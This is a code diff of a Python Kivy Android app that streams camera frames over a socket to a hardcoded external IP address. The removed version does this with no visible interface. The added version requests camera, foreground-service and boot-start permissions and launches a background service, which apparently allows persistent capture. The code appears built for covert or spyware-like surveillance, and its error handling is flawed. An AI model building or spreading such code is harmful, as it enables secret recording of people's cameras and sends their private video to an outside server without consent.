@@ -1,38 +1,54 @@
-import cv2
 import socket
-import base64
+import cv2
 import time
-from threading import Thread
+import threading
+from kivy.app import App
+from kivy.uix.label import Label
+from kivy.utils import platform
+from plyer import notification
 
-def send_video():
-    cap = cv2.VideoCapture(0)  # Открываем камеру
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(('178.95.15.120', 12345))  # Подключение к прокси-серверу
+if platform == 'android':
+    from android.permissions import request_permissions, Permission
+    from jnius import autoclass
 
-    while True:
-        ret, frame = cap.read()
-        if not ret:
-            break
-        _, img_encoded = cv2.imencode('.jpg', frame)
-        img_bytes = img_encoded.tobytes()
-        img_base64 = base64.b64encode(img_bytes).decode('utf-8')
-        client_socket.sendall(img_base64.encode('utf-8'))
-        time.sleep(0.05)  # Задержка между кадрами
+    request_permissions([
+        Permission.CAMERA,
+        Permission.INTERNET,
+        Permission.FOREGROUND_SERVICE,
+        Permission.RECEIVE_BOOT_COMPLETED
+    ])
 
-    cap.release()
-    client_socket.close()
-
-def start_background_service():
-    Thread(target=send_video, daemon=True).start()
+    PythonService = autoclass('org.kivy.android.PythonService')
+    service = PythonService.mService
+    if service is None:
+        service = PythonService.start("service", "service.py")
 
 class CameraApp(App):
     def build(self):
-        start_background_service()
-        return None
+        self.label = Label(text="Streaming Video...")
+        threading.Thread(target=self.stream_video, daemon=True).start()
+        return self.label
 
-    def on_stop(self):
-        pass
+    def stream_video(self):
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            client_socket.connect(('178.95.15.120', 12345))  # IP сервера
+            cap = cv2.VideoCapture(0)
+
+            while True:
+                ret, frame = cap.read()
+                if not ret:
+                    break
+
+                _, buffer = cv2.imencode('.jpg', frame)
+                client_socket.sendall(buffer.tobytes())
+                time.sleep(0.05)
+
+        except Exception as e:
+            print(f"Ошибка: {e}")
+        finally:
+            cap.release()
+            client_socket.close()
 
 if __name__ == '__main__':
     CameraApp().run()
-
